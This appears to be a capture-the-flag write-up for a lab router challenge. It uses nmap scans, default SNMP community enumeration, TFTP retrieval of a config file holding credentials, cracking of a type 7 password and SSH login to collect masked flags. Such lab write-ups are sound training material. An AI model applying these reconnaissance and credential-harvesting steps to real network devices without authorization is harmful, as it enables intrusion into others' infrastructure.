# Trivial takeover

# Get started

### Scan TCP

```
nmap -Pn -n -p- -sS 10.X.X.X

PORT    STATE SERVICE
22/tcp  open  ssh
179/tcp open  bgp

```

TCP scan shows BGP running so we have found a router.  Leaving BGP alone as thats not going to be a way in.

_Not bruting SSH as per-instructions and anyway we don't know the password yet!_
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

As it looks like a router scan UDP as well as routers can run lots of network services

```
nmap -Pn -n -F -sU 10.X.X.X

PORT    STATE         SERVICE
69/udp  open|filtered tftp
161/udp open          snmp
```
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

## Warm up challenge - What is the System Location string?

Hint says **Simple** so enumerate SNMP!

Might have to install SNMP tools
```
apt install snmp
```

Try our luck with the default community 'public'. 

```
snmpwalk -v2c -c public 10.X.X.X .
```

It works and gives a clue as well as the answer to the Challenge question.

```
iso.3.6.1.2.1.1.6.0 = STRING: "**************************"
```
Can't see any RCE opportunitites in SNMP here
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

# Flag 1

### Enumerate TFTP

```
nmap -sU -p69 --script tftp-enum.nse 10.X.X.X

PORT   STATE SERVICE
69/udp open  tftp
| tftp-enum:
|_  *********
```

### Get config

Might have to install a TFTP client
```
apt install tftp
```

```
tftp 10.X.X.X                   
tftp> get *********
tftp> quit  
```

### See if any credentials are in the file - they are!

```
cat *********
```

Also find the 1st flag "THM{**************************}"
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

## Flag 2

### Crack the password

Google _"router type 7 password"_

###  Log in and find the 2nd flag

```
ssh ******@10.X.X.X

cat flag.txt

THM{***************************}
```

